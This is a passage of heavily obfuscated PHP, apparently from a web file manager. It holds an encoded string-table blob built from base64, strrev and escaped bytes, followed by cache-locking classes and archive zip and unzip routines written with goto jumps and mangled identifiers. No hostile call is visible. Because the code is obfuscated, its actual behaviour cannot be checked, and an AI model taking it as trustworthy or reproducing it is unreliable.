x3b\xb7\x33\xe6\xc\x54\xb6\x2\x41\x3b\xe0\xc2\x5a\xe9\x41\x1b\xbf\x23\xcb\x15\xb2\xfc\x5a\x12\x4\xac\x82\x4a\xc9\x80\x85\x11\x16\xf4\x8c\x3".base64_decode('3RA6qHcUGzj4qMSZKQPD/1wH1jpE0kfCSnXqJ8d0eutiz6ZasA7I/Fw3HjuF')."\x2a\x71\xa6\x3f\x27\x9b\x18\x3d\x66\xdc\x44\x51\xca\xe7\xf3\xc3\x6f\x33\x88\x83\x40\xe2\x9c\x8b\x5c\xa9\x90\x1d\x9d\x4f\xbc\x64\x45\x2b\x89\x3a\xa4\x12\x97\x2f\x4a\xb4\xea\x85\x96"."\276\102\43\240\250\225\44\377\357\226\2\347\231\161\126\101\137\263\364\211\255\22\220\40\254\24\164\33\204\15\315\166\27\255\301\53\142\203\167\26\157\141\374\25\32"."\153\133\370\315\244\62\343\20\66\42\276\64\360\3\47\132\6\112\237\131\170\366\151\352\262\125\214\52\47\55\40\110\120\321\104\105\157\264\51\366\276\43\300\220\163".strrev('„¥O»‘™BV¸:¤	·ÿd_#e¡vÙ¹èÎ…FáÅ$?f¦bˆ,')."\304\366\100\214\355\205\257\337\350\67\146\272\230\164\344\224\351\243\63\150\122\205\203\65\305\14\240\11\46\334\13\27\326\254\143\265\125\17\212\361\72\346\71\244\301"."\x32\x95\x72\x61\xc2\x83\x38\xdc\xd5\x83\xc0\x72\xc1\xd2\xd4\xa8\x6a\x10\x59\x97\x52\x2b\xfe\xc8\x7\xb2\x93\xe1\x67\xd5\x68\xad\x5a\xd6\xad\xe0\xf0\x4d\x34\x3b\x41\x15\x89\xcb\xa0"."\xb4\x6a\x74\x7c\x42\xfa\x4b\x16\x2e\x7a\x33\x1d\xa9\x6f\x78\x5a\x98\x71\x91\x2c\x28\x8d\x40\xd0\x9\x8f\x3c\x69\xe2\xb7\xd5\x4e\x37\x40\x1d\x66\x1\x26\xc9\x22\x87\x81\x70\x93\xed"."\35\60\104\174\354\217\203\321\361\243\165\316\151\232\140\245\146\21\7\330\153\30\26\361\300\260\77\13\3\330\51\321\317\35\10\62\14\47\233\47\241\172\110\201\27"."\267\346\260\77\15\227\27\114\162\155\357\107\12\47\231\326\227\41\323\142\267\240\123\2\333\262\246\146\202\320\352\22\137\257\20\302\217\334\221\341\157\312\211\377\77"."\x3f\x15\xf7\xff\xeb\x85\xb8\x71\xb5\xf4\xcc\xd9\xf2\x8c\x58\xb\x61\x70\x29\x37\xd6\x2f\x38\xee\xc4\xe7\x9d\xb6\x71\x58\xb7\xc8\x21\x62\x2a\xc1\x50\x87\x25\x44\x2\x7c\xc1\xc1\xbd"."\307\145\173\44\323\305\64\32\251\23\13\352\333\102\246\367\51\62\174\30\247\344\374\222\76\50\5\60\262\233\275\167\124\56\120\372\332\237\5\371\50\277\311\273\231"."\123\343\335\145\356\347\340\24\370\255\276\2\5\56\241\44\33\247\117\200\231\240\156\73\334\364\53\16\305\54\310\112\122\262\50\32\245\5\362\124\40\253\46\224\170".base64_decode('3qmUfCDLVkJFRMphiSqhN2HLLmiJFMHDX7V0WR9pJCXabM/54EwWR5KWw+bS').base64_decode('69rS0mwxi0Wghqf1yIa9DFhrfyqwzlnaGFawhucJQSjxU4RE9xHovrBMGbws')."\103\74\317\40\350\137\176\21\262\167\35\5\101\30\174\211\343\245\213\271\103\327\20\53\146\215\145\247\32\202\176\234\360\114\135\311\323\131\266\163\175\40\36\361\213".base64_decode('LlVDPj/JsEOdbVXIRoBgKuDuhedgzWweH4aRTmMjHMvRkyG68bXa6gjKr9YE')."\xa8\xad\x6c\x5d\x29\x53\xca\x65\x8b\x6b\xba\x21\x64\x63\xf1\xe5\xf2\xc2\xd7\xc9\x4c\xb\x34\xb9\x23\x56\xbb\x3\x56\x24\xa\x63\xe9\xd6\x22\xe4\x92\x5b\x45\x31\x4a\xb8\x74\x3\xec"."\x6d\xc2\xaa\x25\x89\x12\x51\x34\x75\x5\x45\xdf\x8\xe6\xd7\x46\xd6\x5b\x3b\xe6\x83\xb2\x84\x52\x15\x54\xbf\x90\x8c\x4a\x51\x67\x22\xe0\x17\x9a\x24\xf9\xb8\xdd\x36\x4a\xc6\x87\xdd".base64_decode('nh7ZpHdf9lKdFllCuOOLI9zxll7j8NslYfOnxaAwwmmtLV4g/pzayT385oZz')."\277\211\4\173\160\322\222\225\75\70\317\142\101\14\177\233\22\362\72\202\225\43\327\216\125\212\366\67\320\134\242\145\244\45\143\151\54\267\202\264\217\13\255\5\213"."\203\124\227\150\76\311\260\205\107\141\147\273\114\41\105\20\41\240\276\67\327\124\301\175\144\2\62\157\322\152\254\311\262\261\311\0\171\220\166\275\323\22\153\23\212"."\340\161\3\335\237\155\111\206\370\110\246\365\116\116\224\330\205\271\125\62\176\241\72\361\276\156\320\2\241\362\215\160\164\263\202\130\60\164\345\11\164\27\322\54\300".strrev('d ´ñš¨£	pÈûb÷­ŠüÒâÑtÑ:,Èâ^9çâ-O±İ-É¨').base64_decode('lCaWxuslQCUNle+vvVcUpnbRi1dS0h/h0j+slSmDe1S2GE5CTzkz5tBSdhAQ').base64_decode('wLI4CZYtSaaFhTMLoZwpF4xBhlcKPCK+J8oM2Cbk4qyDwbNs5tLmCMbZcyN5')."\277\174\57\270\230\156\273\130\55\327\213\262\231\7\355\105\231\347\151\211\303\254\62\104\224\246\224\41\233\374\26\276\224\100\363\264\62\72\1\270\116\270\371\212\136"."\133\312\44\213\12\6\345\125\20\202\145\227\276\141\325\15\260\305\213\200\241\172\102\100\24\343\17\266\12\312\252\43\54\44\275\220\353\316\121\243\15\120\73\327\346"."\x82\xca\x9a\xec\x59\x53\xd6\x5c\x49\x6d\x56\xd4\xcc\x15\x4\x2d\xcc\xb2\xba\xb3\xe\xf4\xe8\x75\x89\x88\x9a\x91\xe9\x11\xb8\xa0\x76\x8c\xc5\x11\xcd\x54\xe3\x82\x7e\x92\xfd\x99\x6f"."\234\116\33\311\10\47\153\266\103\55\56\306\133\356\245\313\34\373\240\50\302\207\361\323\144\213\22\66\336\330\311\61\72\276\115\153\204\167\255\354\6\5\312\115\16"."\274\137\342\144\370\356\270\3\246\205\265\74\372\235\246\231\46\245\44\100\260\107\71\21\367\6\67\75\207\240\233\0\276\370\165\11\204\42\72\301\107\350\210\310\6".strrev('*†¿‡÷”ĞhgRõ¦0é'."\0".'G‘Fí‚æ¸Ë‘§¸€°Ş'."\0".'K8)’Pz÷$ú')."\333\71\64\256\41\100\360\115\324\264\100\366\266\206\33\247\270\211\107\131\47\252\303\111\74\221\164\345\123\226\342\330\205\76\323\60\374\255\32\310\241\43\257\2\173".strrev('$¿Ÿm¼ÒÁö­I%-J	JŒ’YLv`Y¡Bxu$•/¶wªçĞEçDš').base64_decode('DSq5tEe5/xyc5OtAvfT4/YFZg/XC1zid9wTdmfJT7Xxao0fU9PA/JGeokCzY')."\204\51\131\356\110\211\227\261\312\376\342\274\32\324\243\30\373\260\272\157\267\351\233\121\204\45\25\101\5\225\166\122\167\60\117\142\241\243\116\266\270\31\27\214\6"."\xa4\xd9\xf4\xe0\xf1\xad\xb0\xcb\x72\x95\x2c\xc4\xa3\xc5\x82\x48\x8c\x80\x84\xe2\xee\x8a\x22\x6a\xca\x42\x4c\x3c\x18\x2d\x3d\xa8\x47\xa9\x1c\x22\xb0\xa7\xa7\x69\x44\x25\xaa\x4b\x8b"."\11\7\361\130\50\41\306\131\4\306\202\126\22\376\46\311\377\3\6\22\261\157\175\233\0\0"."", 10, -8))); goto a¬Ô¯Ëà­; a­øøãëéº: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto A¬¢—¤ßÌ¬; cˆ‰Şïœ‚: if ($cë‰ÛªŞ–Ô == $a¡Ï„òìÄ[17] && $CÆØŸ¢Â½Ù == $a¡Ï„òìÄ[9]) { $cë‰ÛªŞ–Ô = $a¡Ï„òìÄ[191]; } switch ($cë‰ÛªŞ–Ô) { case $a¡Ï„òìÄ[774]: self::$handle = new CacheLockRedis(); break; case $a¡Ï„òìÄ[775]: self::$handle = new CacheLockMemcached(); break; case $a¡Ï„òìÄ[17]: self::$handle = new CacheLockDatabase(); break; case $a¡Ï„òìÄ[191]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Fêã´Ç½¾¸; F£ãËê®µ: self::$timeout = $e¯ì¯×ê˜[$a¡Ï„òìÄ[784]] ? $e¯ì¯×ê˜[$a¡Ï„òìÄ[784]] : 10; $CÆØŸ¢Â½Ù = _get($GLOBALS[$a¡Ï„òìÄ[6]], $a¡Ï„òìÄ[785]); $cë‰ÛªŞ–Ô = $e¯ì¯×ê˜[$a¡Ï„òìÄ[771]] ? $e¯ì¯×ê˜[$a¡Ï„òìÄ[771]] : $a¡Ï„òìÄ[191]; goto cˆ‰Şïœ‚; A¬¢—¤ßÌ¬: $a¡Ï„òìÄ =& $_SERVER[¹Ò‹Ò¹]; if (self::$handle) { return self::$handle; } $e¯ì¯×ê˜ = $GLOBALS[$a¡Ï„òìÄ[6]][$a¡Ï„òìÄ[345]]; goto F£ãËê®µ; Fêã´Ç½¾¸: } private static function key($bŒ•‚»ÂçŠ) { return $_SERVER[¹Ò‹Ò¹][786] . Cache::key($bŒ•‚»ÂçŠ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($b†Õ‘–ÂÏµ = '') { self::$errorMsg = $b†Õ‘–ÂÏµ; } public static function lockGlobal($dª‘½ŞÂˆ, $bÙÃ¹å‘) { return self::lock($dª‘½ŞÂˆ, $bÙÃ¹å‘, !0); } public static function lock($DËÁ‘Í¸÷Õ, $f«½ğÄ…ß = false, $bììø…õ© = false) { goto aá’™çÁĞ; CåË¬²§¼×: $f«½ğÄ…ß = $f«½ğÄ…ß ? $f«½ğÄ…ß : self::$timeout; $B¨ƒ¬¾  = $a½â¶Š¡Ú¿->lock($e´‹ù˜Ÿ­, $f«½ğÄ…ß); if (!$B¨ƒ¬¾ ) { $c“æŸ˜äãÕ = "\x6c\157\x63\153\x20\145\162\x72\x6f\x72\73\153\145\x79\x3d{$DËÁ‘Í¸÷Õ}\x3b\x74\151\x6d\145\x3d{$f«½ğÄ…ß}\73" . self::$errorMsg . $DØĞ§Ø”öœ[67] . get_caller_msg(); $DïÓ¨øâ­Ê = LNG($DØĞ§Ø”öœ[787]) . "\50{$f«½ğÄ…ß}\x73\x29\x2e" . LNG($DØĞ§Ø”öœ[788]); $DïÓ¨øâ­Ê .= $DØĞ§Ø”öœ[789]; if (is_string(self::$errorMsg) && self::$errorMsg) { $DïÓ¨øâ­Ê = $DïÓ¨øâ­Ê . $DØĞ§Ø”öœ[790] . self::$errorMsg; } write_log($c“æŸ˜äãÕ, $DØĞ§Ø”öœ[791]); show_json($DïÓ¨øâ­Ê, !1); } goto Dó…š¾Á‘ò; Dó…š¾Á‘ò: if (!$bììø…õ©) { self::$lockItem[$e´‹ù˜Ÿ­] = !0; } return $B¨ƒ¬¾ ; goto B¥òÓŒÍË´; aá’™çÁĞ: $DØĞ§Ø”öœ =& $_SERVER[¹Ò‹Ò¹]; $a½â¶Š¡Ú¿ = self::init(); $e´‹ù˜Ÿ­ = self::key($DËÁ‘Í¸÷Õ); goto CåË¬²§¼×; B¥òÓŒÍË´: } public static function lockGet($dÕŠåÆ¶®ç) { $aí»ÈÀÉä¼ = self::key($dÕŠåÆ¶®ç); if (self::$lockItem[$aí»ÈÀÉä¼]) { return self::$lockItem[$aí»ÈÀÉä¼]; } return self::init()->lockGet($aí»ÈÀÉä¼); } public static function unlock($D‰¯½„âÈ·) { $A×¶›»õÔ = self::key($D‰¯½„âÈ·); self::$lockItem[$A×¶›»õÔ] = null; return self::init()->unlock($A×¶›»õÔ); } public static function unlockRuntime() { $eãŠ¯Ï®Ş¡ =& $_SERVER[¹Ò‹Ò¹]; $bÚ¨ğåßÀ‰ = self::init(); $cä‘ùç™‹ = !1; foreach (self::$lockItem as $cáÏ¸˜ŒöŠ => $A°‚È½¹²‚) { if (!$A°‚È½¹²‚) { continue; } $bÚ¨ğåßÀ‰->unlock($cáÏ¸˜ŒöŠ); if (!$cä‘ùç™‹) { $cä‘ùç™‹ = !0; write_log($eãŠ¯Ï®Ş¡[792] . $cáÏ¸˜ŒöŠ . $eãŠ¯Ï®Ş¡[67] . get_caller_msg(), $eãŠ¯Ï®Ş¡[791]); continue; } write_log($eãŠ¯Ï®Ş¡[792] . $cáÏ¸˜ŒöŠ, $eãŠ¯Ï®Ş¡[791]); } self::fileUnlockAll(); } public static function fileLock($Cˆ‰æ¼±) { goto BØé¥³Ò³±; BØé¥³Ò³±: $bĞº„ÍŠÜ =& $_SERVER[¹Ò‹Ò¹]; if (!$GLOBALS[$bĞº„ÍŠÜ[793]]) { $GLOBALS[$bĞº„ÍŠÜ[793]] = array(); } $GLOBALS[$bĞº„ÍŠÜ[793]][$Cˆ‰æ¼±] = !1; goto E×½ßõÉÚö; aèö¸ÚÉÉ: if (flock($C‡“«ÒïíÇ, LOCK_EX)) { return !0; } self::unlock($Cˆ‰æ¼±); show_json($bĞº„ÍŠÜ[796], !1); goto B„……„ÃÌ; B„……„ÃÌ: return !1; goto D¢Å»‰õ¶—; E×½ßõÉÚö: $C‡“«ÒïíÇ = fopen(DATA_PATH . $Cˆ‰æ¼± . $bĞº„ÍŠÜ[794], $bĞº„ÍŠÜ[795]); if (!$C‡“«ÒïíÇ) { return !1; } $GLOBALS[$bĞº„ÍŠÜ[793]][$Cˆ‰æ¼±] = $C‡“«ÒïíÇ; goto aèö¸ÚÉÉ; D¢Å»‰õ¶—: } public static function fileUnlock($fÕ¿§£ï´¹) { $Eê¤“Şàß =& $_SERVER[¹Ò‹Ò¹]; $Aß»‘î‚½é = $GLOBALS[$Eê¤“Şàß[793]][$fÕ¿§£ï´¹]; if (!$Aß»‘î‚½é) { return; } $GLOBALS[$Eê¤“Şàß[793]][$fÕ¿§£ï´¹] = !1; flock($Aß»‘î‚½é, LOCK_UN); fclose($Aß»‘î‚½é); } public static function fileUnlockAll() { $Fèº”ö†‰í =& $_SERVER[¹Ò‹Ò¹]; if (!$GLOBALS[$Fèº”ö†‰í[793]]) { return; } foreach ($GLOBALS[$Fèº”ö†‰í[793]] as $DŸÛ´–½İì => $eçªƒÇ‹¢) { if (!$eçªƒÇ‹¢) { continue; } $GLOBALS[$Fèº”ö†‰í[793]][$DŸÛ´–½İì] = !1; flock($eçªƒÇ‹¢, LOCK_UN); fclose($eçªƒÇ‹¢); } $GLOBALS[$Fèº”ö†‰í[793]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $d¹˜’ğ³³Ì =& $_SERVER[¹Ò‹Ò¹]; $b½‚À§›¥ = $GLOBALS[$d¹˜’ğ³³Ì[6]][$d¹˜’ğ³³Ì[345]]; self::$cachePath = $b½‚À§›¥[$d¹˜’ğ³³Ì[191]][$d¹˜’ğ³³Ì[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A“½÷Î‹é†, $Câ©˜Ã¨£½ = 0) { goto eÃßñÇÂ; FçÛĞÍ¨ó: $Bõ¦Ü„šª¸ = rtrim(self::$cachePath, $bâ¡ÂÙÌ×[8]) . $bâ¡ÂÙÌ×[797] . md5($A“½÷Î‹é†) . $bâ¡ÂÙÌ×[794]; if (file_exists($Bõ¦Ü„šª¸) && filemtime($Bõ¦Ü„šª¸) && filemtime($Bõ¦Ü„šª¸) < time() - 10) { @unlink($Bõ¦Ü„šª¸); } do { if (file_exists($Bõ¦Ü„šª¸)) { cacheLockWait(); continue; } $BÎ†ÚâË×à = fopen($Bõ¦Ü„šª¸, $bâ¡ÂÙÌ×[798]); if (!$BÎ†ÚâË×à) { return !1; } $cñå¤„è = flock($BÎ†ÚâË×à, LOCK_EX | LOCK_NB); self::$caches[$A“½÷Î‹é†] = array($bâ¡ÂÙÌ×[799] => $BÎ†ÚâË×à, $bâ¡ÂÙÌ×[191] => $Bõ¦Ü„šª¸); fwrite($BÎ†ÚâË×à, $dî’¾—¼¨Ù); clearstatcache(); if ($BÎ†ÚâË×à && $cñå¤„è) { return !0; } cacheLockWait(); } while (microtime(!0) < $dî’¾—¼¨Ù); goto dÍÍå†Ë¢»; eÃßñÇÂ: $bâ¡ÂÙÌ× =& $_SERVER[¹Ò‹Ò¹]; $d‡àš‹Ÿ = microtime(!0); $dî’¾—¼¨Ù = $d‡àš‹Ÿ + $Câ©˜Ã¨£½ + 0.0001; goto FçÛĞÍ¨ó; dÍÍå†Ë¢»: $this->unlock($A“½÷Î‹é†); return !1; goto d»Ğ•õ¨Ïé; d»Ğ•õ¨Ïé: } public function lockGet($D‰ÒœŒƒ–¼) { $A‚„åÎ‘á =& $_SERVER[¹Ò‹Ò¹]; $f¡ÕÖŒ¿’Œ = rtrim(self::$cachePath, $A‚„åÎ‘á[8]) . $A‚„åÎ‘á[797] . md5($D‰ÒœŒƒ–¼) . $A‚„åÎ‘á[794]; return file_exists($f¡ÕÖŒ¿’Œ); } public function unlock($E¾¾Ó›×©) { goto cÀ˜ƒ¡ÂÏï; eŸñÎíƒøˆ: @flock($B¸à„ÈÂÊ[$aì‚ñ‰ŠĞ[799]], LOCK_UN); @fclose($B¸à„ÈÂÊ[$aì‚ñ‰ŠĞ[799]]); @unlink($B¸à„ÈÂÊ[$aì‚ñ‰ŠĞ[191]]); goto fÁœØ¾¸’; cÀ˜ƒ¡ÂÏï: $aì‚ñ‰ŠĞ =& $_SERVER[¹Ò‹Ò¹]; $B¸à„ÈÂÊ = self::$caches[$E¾¾Ó›×©]; if (!$B¸à„ÈÂÊ) { return; } goto eŸñÎíƒøˆ; fÁœØ¾¸’: unset(self::$caches[$E¾¾Ó›×©]); goto c½ã£³Áéë; c½ã£³Áéë: } } goto f¯‰à£ì…˜; BÏÒ¢ÕÕƒâ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $F•óØ…Şå‹; if (!$F•óØ…Şå‹) { $a¦íÏ¸˜Ã® = IO::init($_SERVER[¹Ò‹Ò¹][8]); } return $a¦íÏ¸˜Ã®; } private static function iconvSystem($DØ“êÔ²ƒÔ) { return self::local()->iconvSystem($DØ“êÔ²ƒÔ); } private static function iconvApp($b·““®×Ğ¹) { return self::local()->iconvApp($b·““®×Ğ¹); } public static function zip($b»©ÀñÏ›Ï, $c¸±È‘’ª‹ = "\x7a\151\x70", $F®È‡Üìƒï = '', $cÑ¼ÊêÙ“Â = REPEAT_RENAME) { goto e…×”î‘×; dœ”×¸‰°: foreach ($BŠ·ìëŞ°˜ as $cÌ±Êê ´ => $e½Ä¸™â‡…) { $BŠ·ìëŞ°˜[$cÌ±Êê ´] = self::iconvSystem($e½Ä¸™â‡…); } KodArchive::create($a¼õº†¼, $BŠ·ìëŞ°˜); if (!IO::exist($a¬¯…ä¤£)) { if ($CßÉé¤ä˜–) { del_dir($CßÉé¤ä˜–); } show_json(LNG($fÒÏèë›Æí[1056]), !1); } goto e›­ÊÜ™ĞÌ; BÖâÌÅ¿òÒ: if (count($BŠ·ìëŞ°˜) > 1) { $DõáÙÀ›¹× = IO::info(IO::pathFather($fè´Õ½Ç˜[$fÒÏèë›Æí[75]])); $cóçæâ¼Í¬ = $DõáÙÀ›¹×[$fÒÏèë›Æí[28]]; } $D»Ş¸óÄé¥ = $CßÉé¤ä˜–; if (!$D»Ş¸óÄé¥) { $D»Ş¸óÄé¥ = get_path_father($fè´Õ½Ç˜[$fÒÏèë›Æí[75]]); if (!$F®È‡Üìƒï && $fõÓç¬ªì¥->getType() == $fÒÏèë›Æí[105]) { $D»Ş¸óÄé¥ = get_path_father($fõÓç¬ªì¥->path); } $c‡îó˜¿À„ = IO::info($D»Ş¸óÄé¥); if (!$c‡îó˜¿À„[$fÒÏèë›Æí[194]]) { show_json(LNG($fÒÏèë›Æí[1055]), !1); } } goto c©ø¶İ¥ Ô; e›­ÊÜ™ĞÌ: if ($F®È‡Üìƒï || !$CßÉé¤ä˜–) { if ($CßÉé¤ä˜– && strstr($CßÉé¤ä˜–, TEMP_FILES)) { $b‚êãÀ½š = $BŠ·ìëŞ°˜ = array(); recursion_dir($D»Ş¸óÄé¥, $b‚êãÀ½š, $BŠ·ìëŞ°˜, 0); foreach ($b‚êãÀ½š as $D¦Œ¹„·åç) { del_dir($D¦Œ¹„·åç); } foreach ($BŠ·ìëŞ°˜ as $A³¸ê÷‘âë) { if ($A³¸ê÷‘âë == $a¼õº†¼) { continue; } del_file($A³¸ê÷‘âë); } } return $a¬¯…ä¤£; } $e¥Ôà°§áô = self::pathFather($fè´Õ½Ç˜[$fÒÏèë›Æí[75]]); $D„ÆîÖä³ = self::move($a¬¯…ä¤£, $e¥Ôà°§áô, $cÑ¼ÊêÙ“Â); goto FÜ”•ÛíÊ; FÜ”•ÛíÊ: if (!$D„ÆîÖä³) { del_dir($CßÉé¤ä˜–); show_json(LNG($fÒÏèë›Æí[1056]), !1); } del_dir($CßÉé¤ä˜–); return $D„ÆîÖä³; goto dÇ‹Æå±ºÖ; e…×”î‘×: $fÒÏèë›Æí =& $_SERVER[¹Ò‹Ò¹]; $fõÓç¬ªì¥ = self::init($b»©ÀñÏ›Ï[0][$fÒÏèë›Æí[75]]); $fè´Õ½Ç˜ = self::info($b»©ÀñÏ›Ï[0][$fÒÏèë›Æí[75]]); goto BŸ¥ŒÁØ; c©ø¶İ¥ Ô: $a¬¯…ä¤£ = $D»Ş¸óÄé¥ . $cóçæâ¼Í¬ . $fÒÏèë›Æí[94] . $c¸±È‘’ª‹; $a¬¯…ä¤£ = get_filename_auto($a¬¯…ä¤£, $fÒÏèë›Æí[33], $cÑ¼ÊêÙ“Â); $a¼õº†¼ = self::iconvSystem($a¬¯…ä¤£); goto dœ”×¸‰°; BŸ¥ŒÁØ: $CßÉé¤ä˜– = !1; if (!$F®È‡Üìƒï && $fõÓç¬ªì¥->getType() == $fÒÏèë›Æí[105]) { $BŠ·ìëŞ°˜ = self::zipFileList($b»©ÀñÏ›Ï); } else { $CßÉé¤ä˜– = $F®È‡Üìƒï ? $F®È‡Üìƒï : TEMP_FILES . $fÒÏèë›Æí[1054] . time() . rand_string(8) . $fÒÏèë›Æí[8]; mk_dir($CßÉé¤ä˜–); $BŠ·ìëŞ°˜ = self::zipFileList($b»©ÀñÏ›Ï, $CßÉé¤ä˜–); } $cóçæâ¼Í¬ = $fè´Õ½Ç˜[$fÒÏèë›Æí[28]]; goto BÖâÌÅ¿òÒ; dÇ‹Æå±ºÖ: } public static function unzip($CšÆ†¹®„º, $DÙì‚í‡Ôö = "\x72\145\160\154\141\143\145") { goto A»æ¾Â„Ğã; F®Öİ¬•Ô: mk_dir($A¡öÖÅ’Š); $cÇ“¢Ê·ø = self::fileExt($AùĞÅŠõºÓ); $e™Ö…äó¡¯ = $A¡öÖÅ’Š . $AŒÂØØèÑ°[94] . $cÇ“¢Ê·ø; goto Bîõ™ğ”à; Bîõ™ğ”à: if (!@file_exists(self::iconvSystem($e™Ö…äó¡¯))) { $f¢í¿µÕá = self::localFilePath($Fí Ç§‚ù, $cÇ“¢Ê·ø); $e™Ö…äó¡¯ = $f¢í¿µÕá ? $f¢í¿µÕá : parent::download($Fí Ç§‚ù, $e™Ö…äó¡¯); } $e™Ö…äó¡¯ = self::iconvSystem($e™Ö…äó¡¯); $EÎ¡ÁÎ¹ = isset($CšÆ†¹®„º[$AŒÂØØèÑ°[1059]]) ? $CšÆ†¹®„º[$AŒÂØØèÑ°[1059]] : $AŒÂØØèÑ°[1060]; goto c’Ï‡Î¦£; CŠÀ÷ä÷©”: foreach ($Fôè˜ÏæäÂ as $E÷«»í…Ñ“) { $E÷«»í…Ñ“ = self::iconvApp($E÷«»í…Ñ“); self::move($E÷«»í…Ñ“, $CùìœÇÛ÷˜, $DÙì‚í‡Ôö); } del_dir($A¡öÖÅ’Š); if (!$f¢í¿µÕá) { del_file($e™Ö…äó¡¯); } goto dî¹–¶Ã´©; dî¹–¶Ã´©: return !0; goto dˆœêÅª‡; Eá¥¹Ñ»î¦: $bµâÖò = self::tmpFileName($AùĞÅŠõºÓ); $A¡öÖÅ’Š = TEMP_FILES . $bµâÖò; del_dir($A¡öÖÅ’Š); goto F®Öİ¬•Ô; dŠæ¯…ˆ˜¢: if (!($AùĞÅŠõºÓ = parent::info($Fí Ç§‚ù))) { show_json(LNG($AŒÂØØèÑ°[1058]), !1); } if (!($dÈöÙÍƒÊƒ = parent::infoFull($CùìœÇÛ÷˜))) { $CùìœÇÛ÷˜ = parent::mkdir($CùìœÇÛ÷˜); $dÈöÙÍƒÊƒ = array($AŒÂØØèÑ°[75] => $CùìœÇÛ÷˜); } else { if (isset($dÈöÙÍƒÊƒ[$AŒÂØØèÑ°[390]]) && trim($dÈöÙÍƒÊƒ[$AŒÂØØèÑ°[75]], $AŒÂØØèÑ°[8]) != trim($CùìœÇÛ÷˜, $AŒÂØØèÑ°[8])) { $EæÈ×ËÂ÷ = KodIO::make($dÈöÙÍƒÊƒ[$AŒÂØØèÑ°[472]]); $d’¯Õ¥…‚ = parent::fileNameAuto($EæÈ×ËÂ÷, $dÈöÙÍƒÊƒ[$AŒÂØØèÑ°[28]], REPEAT_RENAME_FOLDER, !0); $CùìœÇÛ÷˜ = parent::mkdir($EæÈ×ËÂ÷ . $d’¯Õ¥…‚); $dÈöÙÍƒÊƒ = array($AŒÂØØèÑ°[75] => $CùìœÇÛ÷˜); } } $CùìœÇÛ÷˜ = $dÈöÙÍƒÊƒ[$AŒÂØØèÑ°[75]]; goto Eá¥¹Ñ»î¦; c’Ï‡Î¦£: $AÛğÄñ‘ = KodArchive::extract($e™Ö…äó¡¯, $A¡öÖÅ’Š . $AŒÂØØèÑ°[8], $EÎ¡ÁÎ¹); self::archiveExt(); if (!$AÛğÄñ‘[$AŒÂØØèÑ°[1061]]) { show_json($AŒÂØØèÑ°[1062] . $AÛğÄñ‘[$AŒÂØØèÑ°[1063]], !1); } goto CÖ‘Ää¿Ñİ; A»æ¾Â„Ğã: $AŒÂØØèÑ° =& $_SERVER[¹Ò‹Ò¹]; $Fí Ç§‚ù = $CšÆ†¹®„º[$AŒÂØØèÑ°[75]]; $CùìœÇÛ÷˜ = $CšÆ†¹®„º[$AŒÂØØèÑ°[1057]]; goto dŠæ¯…ˆ˜¢; CÖ‘Ää¿Ñİ: Hook::trigger($AŒÂØØèÑ°[1064], $A¡öÖÅ’Š); recursion_dir($A¡öÖÅ’Š, $Dª¥‹Êßƒæ, $EæÜ†©ô«, 0); $Fôè˜ÏæäÂ = array_merge($Dª¥‹Êßƒæ, $EæÜ†©ô«); goto CŠÀ÷ä÷©”; dˆœêÅª‡: } public static function unzipList($Eè¹½°óÁÍ) { goto B¿éÚÓŞ¬ñ; FÇÜ‰ôÒ‚: $cÀ‹´‹Êíç = self::iconvSystem($cÀ‹´‹Êíç); if ($däŒ±¾ Î¿ >= 0) { $fŠ¡£Ãˆå­ = isset($Eè¹½°óÁÍ[$F‹¤ô˜öå¼[1069]]) ? $Eè¹½°óÁÍ[$F‹¤ô˜öå¼[1069]] : !1; $AçéÆ³›æµ = isset($Eè¹½°óÁÍ[$F‹¤ô˜öå¼[28]]) ? $Eè¹½°óÁÍ[$F‹¤ô˜öå¼[28]] : $F‹¤ô˜öå¼[33]; KodArchive::filePreview($cÀ‹´‹Êíç, $däŒ±¾ Î¿, $fŠ¡£Ãˆå­, $AçéÆ³›æµ); self::archiveExt(); die; } $EìÈÑ®—… = KodArchive::listContent($cÀ‹´‹Êíç); goto A‘¬Íõì›ò; aó ¼ßùÊÒ: if (!is_dir($Bµ©³Ä›Ó)) { mk_dir($Bµ©³Ä›Ó); } $cÀ‹´‹Êíç = $Bµ©³Ä›Ó . $F‹¤ô˜öå¼[8] . $A™Ÿ‡Åßã§; if (!@file_exists(self::iconvSystem($cÀ‹´‹Êíç))) { if (isset($CÖ½îŒ)) { url_request($aŞ¾È©İ‡„, $F‹¤ô˜öå¼[1068], $cÀ‹´‹Êíç); } else { $eØ¨åÀ†î  = self::localFilePath($aŞ¾È©İ‡„, $e­¬İìšÅ—); $cÀ‹´‹Êíç = $eØ¨åÀ†î  ? $eØ¨åÀ†î  : self::download($aŞ¾È©İ‡„, $cÀ‹´‹Êíç); } } goto FÇÜ‰ôÒ‚; A‘¬Íõì›ò: self::archiveExt(); del_dir($Bµ©³Ä›Ó); if (!$EìÈÑ®—…[$F‹¤ô˜öå¼[1061]]) { show_json($EìÈÑ®—…[$F‹¤ô˜öå¼[1063]], !1); } goto e‚ì¥õÙ¡; c Å†•Å“: return $EìÈÑ®—…[$F‹¤ô˜öå¼[1063]]; goto CôÌ¡ª„”ö; B¿éÚÓŞ¬ñ: $F‹¤ô˜öå¼ =& $_SERVER[¹Ò‹Ò¹]; $aŞ¾È©İ‡„ = $Eè¹½°óÁÍ[$F‹¤ô˜öå¼[75]]; $däŒ±¾ Î¿ = isset($Eè¹½°óÁÍ[$F‹¤ô˜öå¼[1065]]) ? $Eè¹½°óÁÍ[$F‹¤ô˜öå¼[1065]] : -1; goto C‹‚Ù¨ÆÏ; DŞ†õÁâÉš: $f»Ë‰¹õáª = self::info($b·ï§¬´æ); $e­¬İìšÅ— = self::fileExt($f»Ë‰¹õáª); $EçÆÌ™¾Ÿø = self::tmpFileName($f»Ë‰¹õáª); goto Bù—è™š‹; C‹‚Ù¨ÆÏ: $cç‚áÊ“  = 50000; if (request_url_safe($aŞ¾È©İ‡„)) { $CÖ½îŒ = parse_url_query($aŞ¾È©İ‡„); if (!isset($CÖ½îŒ[$F‹¤ô˜öå¼[75]])) { show_json($F‹¤ô˜öå¼[1066], !1); } } 